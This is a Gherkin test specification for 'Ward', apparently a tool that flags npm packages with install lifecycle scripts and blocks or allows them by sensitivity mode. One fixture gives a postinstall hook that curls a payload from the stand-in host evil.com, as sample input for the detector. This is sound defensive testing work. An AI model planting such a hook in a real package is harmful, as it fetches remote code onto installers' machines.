Feature: Install script detection
  As a developer installing packages
  I want Ward to flag packages that have install lifecycle scripts
  So that I'm aware when a package will execute code during installation

  Background:
    Given Ward is initialized in the project

  # --- Happy paths ---

  Scenario: Package with no install scripts passes cleanly
    Given the package "safe-pkg@1.0.0" has scripts:
      | script | command        |
      | test   | vitest         |
      | build  | tsc            |
    When the developer installs "safe-pkg@1.0.0"
    Then Ward does not flag install scripts

  Scenario: Package with unknown postinstall script triggers warning
    Given the package "sketchy-pkg@1.0.0" has scripts:
      | script      | command                        |
      | postinstall | curl http://evil.com/payload.sh |
    When the developer installs "sketchy-pkg@1.0.0"
    Then Ward shows a yellow "suspicious" warning
    And the developer sees "Has install hooks: postinstall"

  Scenario: Package with preinstall script triggers warning
    Given the package "pre-pkg@1.0.0" has scripts:
      | script     | command         |
      | preinstall | node setup.js   |
    When the developer installs "pre-pkg@1.0.0"
    Then Ward shows a yellow "suspicious" warning
    And the developer sees "Has install hooks: preinstall"

  Scenario: Package with known-safe install script gets info (not warning)
    Given the package "native-pkg@1.0.0" has scripts:
      | script  | command           |
      | install | node-gyp rebuild  |
    When the developer installs "native-pkg@1.0.0"
    Then Ward shows an informational note (not a warning)
    And the package is installed without prompting

  # --- Multiple hooks ---

  Scenario: Package with multiple install hooks
    Given the package "multi-hook@1.0.0" has scripts:
      | script      | command            |
      | preinstall  | node pre.js        |
      | postinstall | node post.js       |
    When the developer installs "multi-hook@1.0.0"
    Then Ward shows a yellow "suspicious" warning
    And the developer sees "Has install hooks: preinstall, postinstall"

  # --- Known-safe patterns ---

  Scenario Outline: Known-safe install scripts produce info, not warning
    Given the package "pkg@1.0.0" has scripts:
      | script  | command   |
      | install | <command> |
    When the developer installs "pkg@1.0.0"
    Then Ward shows an informational note (not a warning)

    Examples:
      | command              |
      | node-gyp rebuild     |
      | prebuild-install     |
      | node install.js      |
      | patch-package        |

  # --- Sensitivity modes ---

  Scenario: Strict mode blocks unknown install scripts
    Given the .wardrc sensitivity is "strict"
    And the package "sketchy@1.0.0" has scripts:
      | script      | command              |
      | postinstall | node mystery-code.js |
    When the developer installs "sketchy@1.0.0"
    Then Ward blocks the installation

  Scenario: Permissive mode allows install scripts silently
    Given the .wardrc sensitivity is "permissive"
    And the package "sketchy@1.0.0" has scripts:
      | script      | command              |
      | postinstall | node mystery-code.js |
    When the developer installs "sketchy@1.0.0"
    Then Ward allows the installation silently

  # --- Edge cases ---

  Scenario: Package with undefined scripts field
    Given the package "no-scripts@1.0.0" has no scripts field
    When the developer installs "no-scripts@1.0.0"
    Then Ward does not flag install scripts

  Scenario: Package with empty scripts object
    Given the package "empty-scripts@1.0.0" has an empty scripts object
    When the developer installs "empty-scripts@1.0.0"
    Then Ward does not flag install scripts
